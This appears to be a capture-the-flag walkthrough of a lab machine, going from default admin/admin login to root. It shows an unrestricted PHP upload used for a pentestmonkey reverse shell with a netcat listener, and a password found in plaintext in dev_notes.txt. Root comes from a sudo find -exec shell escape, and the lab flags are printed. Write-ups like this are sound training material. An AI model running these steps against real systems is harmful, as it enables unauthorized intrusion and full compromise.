phase 02 /

Initial Access — Weak Credentials + File Upload Bypass

Navigating to the web server, we're greeted by a Freshman Portal login page. Default and weak credentials are always worth trying first — admin / admin gets us straight in on the first attempt.

fig 4 — Freshman Portal login page
finding

Default credentials admin / admin accepted — no rate limiting, no lockout.

Once logged in, there's an assignment upload page. The UI claims only .pdf and .docx files are allowed, but this restriction is enforced client-side only — uploading a .php file goes through without issue, and the file is directly accessible via its URL path.

fig 5 — upload page with file type restriction (not enforced server-side)
vulnerability — unrestricted file upload

File type validation is purely client-side. The server accepts any extension including .php, and uploaded files are served directly — allowing remote code execution.

phase 03 /

Foothold — PHP Reverse Shell

With arbitrary PHP execution available, the next step is a reverse shell. We grab the classic pentestmonkey PHP reverse shell, set our attacker IP and chosen port, and upload it through the assignment page.

fig 6 — reverse shell uploaded and accessible
1

Start a netcat listener on port 1234 before triggering the shell:

attacker machine
$ nc -nlvp 1234
listening on [any] 1234 ...
2

Navigate to the uploaded PHP file in the browser to trigger execution. The reverse shell connects back:

shell received
connect to [attacker-ip] from (UNKNOWN) [target-ip]
$ whoami
www-data
note

We land as www-data — the web server process user. This is low privilege, so we need to enumerate the system to escalate further.

phase 04 /

Lateral Movement — Credentials in dev_notes.txt

As www-data there's limited access to useful resources. Static analysis of the filesystem turns up an interesting file: dev_notes.txt.

fig 7 — dev_notes.txt containing plaintext credentials for the freshman user

The file contains plaintext credentials for the freshman user. We switch to that user with sudo freshman (or su freshman) and immediately find the user flag — base64 encoded.

fig 8 — user flag retrieved (base64 encoded)
USER FLAG hack10{3asy_p3asy_1n1t1al_acc3ss}
phase 05 /

Privilege Escalation — sudo find via GTFOBins

With a proper user shell, the next goal is root. First, check what commands freshman can run with elevated privileges:

freshman@machine
$ sudo -l
fig 9 — sudo -l reveals freshman can run find as root

The user can run /usr/bin/find as root without a password. This is a well-known GTFOBins vector — find can execute arbitrary commands via its -exec flag, and since it runs as root here, we can spawn a root shell directly.

gtfobins — find

When find is allowed via sudo, it can break out of restricted environments and spawn a shell with elevated privileges using: sudo find . -exec /bin/sh \; -quit

fig 10 — GTFOBins find payload for sudo privesc
privesc
$ sudo find . -exec /bin/sh \; -quit
# whoami
root
fig 11 — root shell obtained
fig 12 — root flag
ROOT FLAG hack10{r00t_pr1v3sc_v1a_s0ud0_f1nd_w00t}
key takeaways

Three compounding misconfigurations led to full root compromise: default credentials with no lockout policy, server-side file upload validation missing entirely, and an overly permissive sudoers entry granting a low-privilege user unrestricted access to find. Any one of these alone is serious — all three together make the box trivially rootable.
